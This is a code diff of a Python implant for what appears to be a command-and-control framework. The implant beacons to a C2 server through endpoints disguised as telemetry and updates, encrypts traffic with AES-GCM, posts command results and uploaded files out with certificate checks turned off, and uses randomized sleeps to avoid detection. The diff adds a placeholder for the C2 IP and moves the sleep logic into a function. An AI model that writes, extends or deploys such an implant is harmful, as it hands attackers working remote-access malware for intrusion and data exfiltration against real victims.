@@ -16,11 +16,15 @@ from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives import serialization
-import urllib3
+# import urllib3
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-C2_URL = "https://" + "127.0.0.1" + ":" + "8443"
+HOST = ""  # put c2 ip here
+if not HOST:
+    print("HOST not defined!")
+    exit()
+C2_URL = "https://" + HOST + ":" + "8443"
 BEACON_URL = C2_URL + "/api/telemetry"
 RESULT_URL = C2_URL + "/api/updates"
 FILE_URL = C2_URL + "/api/upload"
@@ -33,7 +37,8 @@ attempts = 0
 derived_key = None
 
 
-def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
+# def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
+def encrypt_data(aes_key: bytes, plaintext: bytes) -> bytes:
     """Encrypt data using AES-256-GCM with nonce and encode with base64"""
     if isinstance(plaintext, str):
         plaintext = plaintext.encode()
@@ -103,6 +108,13 @@ def exchange_keys(derived_key: bytes, attempts: int, long_sleep: bool):
     return derived_key, attempts, long_sleep
 
 
+def sleep():
+    if long_sleep:
+        time.sleep(random.randrange(*long_sleep_range))
+    else:
+        time.sleep(random.randrange(*normal_sleep_range))
+
+
 while True:
     if attempts >= 3:
         long_sleep = True
@@ -119,6 +131,7 @@ while True:
         # contingency: enter long sleep mode if can't reach C2 until we can
         if not r.ok:
             attempts += 1
+            sleep()
             continue
         # request successful
         long_sleep = False
@@ -197,14 +210,7 @@ while True:
                 )
                 requests.post(RESULT_URL, data=result_payload, timeout=5, verify=False)
 
-        if long_sleep:
-            time.sleep(random.randrange(*long_sleep_range))
-        else:
-            time.sleep(random.randrange(*normal_sleep_range))
-
+        sleep()
     except requests.RequestException as e:
         print(f"[!] Error: {e}")
-        if long_sleep:
-            time.sleep(random.randrange(*long_sleep_range))
-        else:
-            time.sleep(random.randrange(*normal_sleep_range))
+        sleep()
